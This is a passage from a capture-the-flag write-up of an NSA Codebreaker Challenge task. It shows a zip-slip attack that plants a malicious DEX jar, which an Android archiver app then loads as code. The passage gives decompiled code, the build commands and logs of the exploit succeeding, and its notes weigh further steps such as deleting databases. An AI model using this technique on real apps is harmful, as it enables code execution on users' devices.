            filesDir = context.getFilesDir();
        }
        r.b(filesDir);
        this.archiveDir = filesDir;
    }

    /* JADX DEBUG: Don't trust debug lines info. Lines numbers was adjusted: min line is 1 */
    /* JADX INFO: Access modifiers changed from: private */
    public static final ClassLoader _init_$lambda$1(ZipArchiver zipArchiver, String path) {
        r.e(path, "path");
        return new PathClassLoader(path, zipArchiver.getClass().getClassLoader());
    }

    /* JADX DEBUG: Don't trust debug lines info. Lines numbers was adjusted: min line is 1 */
    public final ZipFile zipFile(String fileName) {
        r.e(fileName, "fileName");
        File file = new File(this.archiveDir, fileName);
        d dVar = this.zipManager;
        String absolutePath = file.getAbsolutePath();
        r.d(absolutePath, "getAbsolutePath(...)");
        dVar.getClass();
        return new b(new File(absolutePath), dVar.f4239c, new j(2, dVar));
    }
}
```

Poking around in the decompiled code some more, we find that the line `File file = new File(dVar.f4240d, dVar.f4243g + "." + E.a(ZipFormat.class).d() + "_" + lowerCase + ".jar");` is called if `getting format for 7z` is successful. We ask Claude, who explains that `dVar.f4243g + "." + E.a(ZipFormat.class).d() + "_" + lowerCase + ".jar"` will resolve to `net.axolotl.zippier.ZipFormat_7z.jar`. So, the app is looking for this file for `.7z` files. In which directory is it looking for this file? According to `zippier.json`, this file should be in `/data/data/com.badguy.mmarchiver/cache/zippier/formats/`. Perfect! We have an attack that can put this file there, so let's make our `..zip` and try it out!

We make a zip named `...zip` with the following structure to trigger the `.7z` download:
```sh
...zip
    |
    formats/net.axolotl.zippier.ZipFormat_7z.jar
    trigger.7z
```

The following log output is generated:
```
01-07 20:01:49.247  4034 30626 D FileDownloadWorker: starting
01-07 20:01:49.269  4034 30787 D FileDownloadWorker: downloading file id=rymakeuj338abqnfk43hgofseo name=...zip
01-07 20:01:49.290  4034 30626 D FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/...zip
01-07 20:01:49.291  4034 30626 D d       : [DefaultDispatcher-worker-3] getting format for zip
01-07 20:01:49.291  4034 30626 D b       : [DefaultDispatcher-worker-3] found format for zip
01-07 20:01:49.291  4034 30626 D a       : [DefaultDispatcher-worker-3] processing zip archive /data/user/0/com.badguy.mmarchiver/cache/download/...zip
01-07 20:01:49.291  4034 30626 D a       : [DefaultDispatcher-worker-3] processing zip entry formats/net.axolotl.zippier.ZipFormat_7z.jar
01-07 20:01:49.291  4034 30626 D d       : [DefaultDispatcher-worker-3] getting format for jar
01-07 20:01:49.291  4034 30626 D a       : [DefaultDispatcher-worker-3] processing zip entry trigger.7z
01-07 20:01:49.291  4034 30626 D d       : [DefaultDispatcher-worker-3] getting format for 7z
01-07 20:01:49.291  4034 30626 D d       : [DefaultDispatcher-worker-3] attempting format load from /data/user/0/com.badguy.mmarchiver/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar
01-07 20:01:49.292  4034 30626 W dguy.mmarchiver: Expected valid zip or dex file
01-07 20:01:49.293  4034 30626 E d       : [DefaultDispatcher-worker-3] failed to load format from /data/user/0/com.badguy.mmarchiver/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar: java.lang.ClassNotFoundException: Didn't find class "net.axolotl.zippier.ZipFormat_7z" on path: DexPathList[[zip file "/data/user/0/com.badguy.mmarchiver/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar"],nativeLibraryDirectories=[/system/lib64, /system_ext/lib64]]
01-07 20:01:49.293  4034 30626 D b       : [DefaultDispatcher-worker-3] creating archive at /storage/emulated/0/Android/data/com.badguy.mmarchiver/files/...zip-1767834109291.tar.xz
01-07 20:01:49.293  4034 30626 D b       : [DefaultDispatcher-worker-3] adding entry b[zippier/] to archive file
01-07 20:01:49.319  4034 30626 D b       : [DefaultDispatcher-worker-3] adding entry b[net.axolotl.zippier.ZipFormat_7z] to archive file
01-07 20:01:49.320  4034 30626 D b       : [DefaultDispatcher-worker-3] adding entry b[trigger] to archive file
01-07 20:01:49.325  4034 30626 D b       : [DefaultDispatcher-worker-3] deleting extraction directory /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/..
01-07 20:01:49.325  4034 30626 E FileDownloadWorker: failed to create archive file: java.io.FileNotFoundException: Cannot delete file: /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/..
01-07 20:01:49.333  4034 30626 I FileDownloadWorker: file download failed, requeueing (error=FILE_ARCHIVE_FAILED)
```

We are hampered by the following error, which means we can't just naively name our eploit file the same name. It seems that the app is looking for a specific format.
```
01-07 20:01:49.292  4034 30626 W dguy.mmarchiver: Expected valid zip or dex file
01-07 20:01:49.293  4034 30626 E d       : [DefaultDispatcher-worker-3] failed to load format from /data/user/0/com.badguy.mmarchiver/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar: java.lang.ClassNotFoundException: Didn't find class "net.axolotl.zippier.ZipFormat_7z" on path: DexPathList[[zip file "/data/user/0/com.badguy.mmarchiver/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar"],nativeLibraryDirectories=[/system/lib64, /system_ext/lib64]]
```

By seraching for the string `failed to load format from`, we find that the constructor for a() is failing in the `try` block:
```java
    public static void a(d dVar, File file) {
        LinkedHashMap linkedHashMap = dVar.f4241e;
        Logger logger = dVar.f4238b;
        j jVar = dVar.f4237a;
        logger.debug("attempting format load from {}", file);
        file.setWritable(false, false);
        try {
            String absolutePath = file.getAbsolutePath();
            r.d(absolutePath, "getAbsolutePath(...)");
            Object objNewInstance = ZipArchiver._init_$lambda$1((ZipArchiver) jVar.f1105e, absolutePath).loadClass(b4.c.a(file.getName())).getDeclaredConstructor(null).newInstance(null);
            r.c(objNewInstance, "null cannot be cast to non-null type net.axolotl.zippier.ZipFormat");
            ZipFormat zipFormat = (ZipFormat) objNewInstance;
            logger.info("loaded format from " + zipFormat);
            linkedHashMap.put(zipFormat.getExtension(), zipFormat);
        } catch (Throwable th) {
            logger.error("failed to load format from " + file + ": " + th);
            file.delete();
        }
    }
```

The line that is failing is `ZipArchiver._init_$lambda$1((ZipArchiver) jVar.f1105e, absolutePath).loadClass(b4.c.a(file.getName())).getDeclaredConstructor(null).newInstance(null);` and following that function returns:
```java
    public static final ClassLoader _init_$lambda$1(ZipArchiver zipArchiver, String path) {
        r.e(path, "path");
        return new PathClassLoader(path, zipArchiver.getClass().getClassLoader());
    }
```

This is a dynamic class loader for the ZipArchiver class. `net.axolotl.zippier.ZipFormat_7z.jar` should implement the `net.axolotl.zippier.ZipFormat` class! This is nice because the `ZipFormat` class is very simple and there are examples of it in the code already:
```java
public interface ZipFormat {
    String getExtension();

    void uncompress(File file, File file2, ZipFile zipFile);
}
```

The `uncompess` method takes in the `ZipFile` class, so we will have to implement this too:
```java
public interface ZipFile {
    ZipFile addFile(File file);

    void write();
}
```

Each of these source codes is directly copied to [java/ZipFormat.java](java/ZipFormat.java) and [java/ZipFile.java](java/ZipFile.java), respectively. [java/ZipFormat_7z.java](java/ZipFormat_7z.java) implements both of these.

First, we have to compile these files to java [bytecode](https://en.wikipedia.org/wiki/JVM_bytecode) using `javac -cp "C:\Users\NAWW\AppData\Local\Android\Sdk\platforms\android-36\android.jar" -d java\classes java\ZipFormat.java java\ZipFile.java java\ZipFormat_7z.java`

Then, we have to convert the bytecode to [DEX](https://source.android.com/docs/core/runtime/dex-format) using `C:\Users\NAWW\AppData\Local\Android\Sdk\build-tools\36.0.0\d8.bat --lib C:\Users\NAWW\AppData\Local\Android\Sdk\platforms\android-36\android.jar --classpath java\classes --output net.axolotl.zippier.ZipFormat_7z.jar java\classes\net\axolotl\zippier\ZipFormat_7z.class`

We recreate the attack again using [zipslip.py](zipslip.py) and upload the file. The log output indicates that we have successfully loaded our malicious file.
```
01-15 02:28:43.519  2453 16595 D FileDownloadWorker: downloading file id=dyxiugr7dfba3yyfhkga1g7mae name=...zip
01-15 02:28:43.530  2453 16367 D FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/...zip
01-15 02:28:43.531  2453 16367 D d       : [DefaultDispatcher-worker-1] getting format for zip
01-15 02:28:43.531  2453 16367 D b       : [DefaultDispatcher-worker-1] found format for zip
01-15 02:28:43.531  2453 16367 D a       : [DefaultDispatcher-worker-1] processing zip archive /data/user/0/com.badguy.mmarchiver/cache/download/...zip
01-15 02:28:43.531  2453 16367 D a       : [DefaultDispatcher-worker-1] processing zip entry formats/net.axolotl.zippier.ZipFormat_7z.jar
01-15 02:28:43.531  2453 16367 D d       : [DefaultDispatcher-worker-1] getting format for jar
01-15 02:28:43.531  2453 16367 D a       : [DefaultDispatcher-worker-1] processing zip entry trigger.7z
01-15 02:28:43.531  2453 16367 D d       : [DefaultDispatcher-worker-1] getting format for 7z
01-15 02:28:43.531  2453 16367 D d       : [DefaultDispatcher-worker-1] attempting format load from /data/user/0/com.badguy.mmarchiver/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar
01-15 02:28:43.533  2453 16367 I d       : [DefaultDispatcher-worker-1] loaded format from net.axolotl.zippier.ZipFormat_7z@ff093b
01-15 02:28:43.533  2453 16367 D b       : [DefaultDispatcher-worker-1] creating archive at /storage/emulated/0/Android/data/com.badguy.mmarchiver/files/...zip-1768462123530.tar.xz
01-15 02:28:43.533  2453 16367 D b       : [DefaultDispatcher-worker-1] adding entry b[zippier/] to archive file
01-15 02:28:43.555  2453 16367 D b       : [DefaultDispatcher-worker-1] adding entry b[net.axolotl.zippier.ZipFormat_7z] to archive file
01-15 02:28:43.556  2453 16367 D b       : [DefaultDispatcher-worker-1] adding entry b[trigger] to archive file
01-15 02:28:43.565  2453 16367 D b       : [DefaultDispatcher-worker-1] deleting extraction directory /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/..
01-15 02:28:43.565  2453 16367 E FileDownloadWorker: failed to create archive file: java.io.FileNotFoundException: Cannot delete file: /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/..
01-15 02:28:43.567  2453 16367 I FileDownloadWorker: file download failed, requeueing (error=FILE_ARCHIVE_FAILED)
```

Let's try another challenge submission, fully expecting to take the exploit further. But, that was it! That was the passing exploit!!!

<b>NSA CODEBREAKER CHALLENGE 2025 COMPLETED!!</b>  .....right?


### Notes

  - I tried a zip bomb, small at first to test the servers and then large to try to takeout the device. This was not the answer.
  - Open-ended prompt led to consideration of what constituted "exploits the device". We could delete the Mattermost database in task 6 as that was not a mod or admin restricted function. Then, use our malicious file to delete the app database and get rid of all history, assuming no other backups. Or, could change everyone's backup settings so they would in fact, miss message updates (see task 6 forum posts). Could potentially stay embedded and watch for malicious activity to see if admin is part of a larger network of players.
  - It would be great if there were another task on how to properly exploit the adversary's device! But, I am glad to finally be finished!


## Result

<div align="center">

![Task 7 result](result7.png)

![badge7.png](badge7.png)

</div>